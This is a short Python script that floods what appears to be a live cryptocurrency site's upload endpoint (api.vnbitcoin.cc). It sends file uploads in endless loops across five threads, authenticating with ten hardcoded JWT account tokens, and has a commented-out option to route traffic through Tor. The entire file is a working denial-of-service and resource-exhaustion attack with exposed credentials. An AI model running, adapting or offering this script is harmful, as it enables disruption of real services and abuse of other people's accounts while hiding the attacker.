import requests

#import random
#import string
import threading
import sys


base_url = 'https://api.vnbitcoin.cc'
deposit_url = base_url + "/v1/api/paywithdraw"
read_depo_url = base_url + "/v1/api/webgetuserpay"
upload_url = base_url + "/v1/api/uploadFile"

# If you use the Tor
# rt = RequestsTor(tor_ports=(9050,), tor_cport=9051)

files = {'file': ('water_drop.jpg', open('water_drop.jpg', 'rb'))}


users = [
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTc1ODYsIm5hbWUiOiI4NDAwMDAwMDAwMDMiLCJsZXZlbCI6IiIsImlhdCI6MTY2NTg5NTY5OH0.7W_MzP3-xfA_j-Xv0VVU9ppsixb2Gp3qroU_k8jVPVY',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDg3LCJuYW1lIjoiODQxMjMiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzE5M30.rZjv6KFLihKnNVTzSVSROtxolUtoJuerG1ToJ0G8QbI',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDg5LCJuYW1lIjoiODQxMjQiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzMzM30.t-1-Ycmn3sPcrPpYUqV7BcWZ91iglh_D2z74komtB4g',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDkwLCJuYW1lIjoiODQxMjUiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzM5NH0.0NIjM4oOGrzm1RhqaQmEDKp1kRnu4VEMpd9aB4S4IWY',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDkyLCJuYW1lIjoiODQxMjYiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzQ1NH0.9duORFYp04gyXIlqkoyS7efo88Hsz4BpemUseI52CC4',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDkzLCJuYW1lIjoiODQxMjciLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzUwM30.LgLf1fsAVIJx3ylJsu7Tc2QBZASo7iGpc-_0b1qP0KY',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDk0LCJuYW1lIjoiODQxMjgiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzU2OX0.dyu1syYakkp5bO2jtWrQ9krv2FHPLEVI7FheoQoXoyY',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDk1LCJuYW1lIjoiODQxMjkiLCJsZXZlbCI6IiIsImlhdCI6MTY2NjI3NzYyOX0.dG9SX65CKYgRnmy0Pyk7leMUqGaRpe_pAIvjwf9JNQU',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDk2LCJuYW1lIjoiODQxMjMwIiwibGV2ZWwiOiIiLCJpYXQiOjE2NjYyNzc2ODJ9.FBsS4jhvW9o1kI87ypvuhVzrLDSo0RWWIX4k_D2T8l4',
 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjgyNDk4LCJuYW1lIjoiODQxMjMxIiwibGV2ZWwiOiIiLCJpYXQiOjE2NjYyNzc3MTl9.ZD8y_YuVuWwEz87sy_dKhuOZFylqDkCp8gAAsh0dXH8'
]



def upload():
	index = int(sys.argv[1])

	headers = {
		"authorization": users[index]
	}

	resp = requests.post(upload_url, headers=headers, files=files).json()
	print(resp)


upload()


def flood():
	while True:
		upload()

# flood()

threads = []

for i in range(5):
	t = threading.Thread(target=flood)
	t.daemon = True
	threads.append(t)


for i in range(5):
	threads[i].start()

for i in range(5):
	threads[i].join()





